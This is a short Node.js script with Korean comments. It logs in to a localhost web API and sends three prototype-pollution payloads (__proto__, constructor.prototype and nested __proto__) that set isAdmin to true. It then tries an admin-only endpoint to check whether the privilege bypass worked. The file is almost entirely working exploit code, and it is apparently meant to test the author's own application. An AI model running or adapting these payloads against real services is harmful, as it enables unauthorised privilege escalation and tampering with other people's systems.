const axios = require('axios');

async function testDifferentPayloads() {
  try {
    // 로그인
    const loginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공\n');
    
    // 여러 방법으로 페이로드 시도
    const payloads = [
      {
        name: '방법 1: __proto__',
        data: {
          settings: {
            theme: 'dark',
            "__proto__": {
              "isAdmin": true
            }
          }
        }
      },
      {
        name: '방법 2: constructor.prototype',
        data: {
          settings: {
            theme: 'dark',
            "constructor": {
              "prototype": {
                "isAdmin": true
              }
            }
          }
        }
      },
      {
        name: '방법 3: 중첩된 __proto__',
        data: {
          settings: {
            theme: 'dark',
            nested: {
              "__proto__": {
                "isAdmin": true
              }
            }
          }
        }
      }
    ];
    
    for (const payload of payloads) {
      console.log(`🔥 ${payload.name} 시도...`);
      
      try {
        const response = await axios.post('http://localhost:5000/api/settings/preferences', 
          payload.data, 
          { headers: { Authorization: `Bearer ${token}` } }
        );
        
        console.log('응답:', response.data);
        
        // 권한 테스트
        try {
          const adminResponse = await axios.post('http://localhost:5000/api/settings/global-settings', {
            key: 'test_key',
            value: 'test_value'
          }, {
            headers: { Authorization: `Bearer ${token}` }
          });
          
          console.log('🚨 권한 우회 성공!', adminResponse.data);
        } catch (err) {
          console.log('권한 우회 실패:', err.response?.data?.message);
        }
        
      } catch (error) {
        console.log('요청 실패:', error.response?.data);
      }
      
      console.log('---\n');
    }
    
  } catch (error) {
    console.error('테스트 오류:', error.response?.data || error.message);
  }
}

testDifferentPayloads();
